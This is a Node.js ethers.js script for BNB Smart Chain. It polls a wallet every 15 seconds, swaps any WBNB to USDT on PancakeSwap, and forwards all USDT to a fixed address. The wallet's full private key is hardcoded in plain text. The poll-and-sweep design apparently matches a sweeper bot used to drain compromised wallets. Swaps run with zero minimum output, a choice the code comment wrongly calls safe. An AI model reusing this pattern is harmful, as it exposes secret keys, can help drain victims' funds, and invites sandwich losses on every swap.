const { Wallet, JsonRpcProvider, Contract, parseUnits, getAddress, formatUnits } = require("ethers");

const RPC = "https://bsc-dataseed.binance.org/";
const PCS_ROUTER_ADDR = getAddress("0x10ED43C718714eb63d5aA57B78B54704E256024E");
const WBNB_ADDR = getAddress("0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c");
const USDT_ADDR = getAddress("0x55d398326f99059fF775485246999027B3197955");

const PRIVATE_KEY_577 = "0xa50d553ebc625e246df94fd59b93c7df91d6ee399bb7e790486d57293a46f1a7";
const DESTINATION_85a = getAddress("0x06C1978dBC5736B64B5D9C726d655486B9Dd885a");

async function startAutoSwap() {
    const provider = new JsonRpcProvider(RPC);
    const signer = new Wallet(PRIVATE_KEY_577, provider);
    
    const routerAbi = [
        "function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)",
        "function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts)"
    ];
    const tokenAbi = [
        "function approve(address spender, uint256 amount) public returns (bool)",
        "function transfer(address to, uint256 amount) public returns (bool)",
        "function balanceOf(address account) view returns (uint256)"
    ];

    const router = new Contract(PCS_ROUTER_ADDR, routerAbi, signer);
    const wbnb = new Contract(WBNB_ADDR, tokenAbi, signer);
    const usdt = new Contract(USDT_ADDR, tokenAbi, signer);

    console.log("--- AUTO-SWAP MONITOR ACTIVE (WBNB -> USDT -> 85a) ---");

    setInterval(async () => {
        try {
            const wbnbBal = await wbnb.balanceOf(signer.address);
            const directUsdtBal = await usdt.balanceOf(signer.address);

            // 1. If WBNB is found: Swap to USDT and send to 85a
            if (wbnbBal > 0n) {
                console.log(`Detected WBNB: ${formatUnits(wbnbBal, 18)}. Starting Swap...`);
                
                // Approve Router to spend WBNB
                await wbnb.approve(PCS_ROUTER_ADDR, wbnbBal);
                
                // Execute Swap
                const path = [WBNB_ADDR, USDT_ADDR];
                const deadline = Math.floor(Date.now() / 1000) + 60 * 10; // 10 min
                
                const tx = await router.swapExactTokensForTokens(
                    wbnbBal,
                    0, // 0 for max slippage (fine for large liquidity pairs like WBNB/USDT)
                    path,
                    DESTINATION_85a, // Sends swapped USDT directly to 85a
                    deadline,
                    { gasLimit: 300000, gasPrice: parseUnits("10", "gwei") }
                );
                console.log(`Swap & Shift Successful! Tx: ${tx.hash}`);
            }

            // 2. If USDT is already there: Transfer directly to 85a
            if (directUsdtBal > 0n) {
                console.log(`Detected direct USDT: ${formatUnits(directUsdtBal, 18)}. Shifting to 85a...`);
                const tx = await usdt.transfer(DESTINATION_85a, directUsdtBal);
                console.log(`Direct Shift Successful! Tx: ${tx.hash}`);
            }

        } catch (e) {
            console.log("Waiting for network release...");
        }
    }, 15000);
}

startAutoSwap();
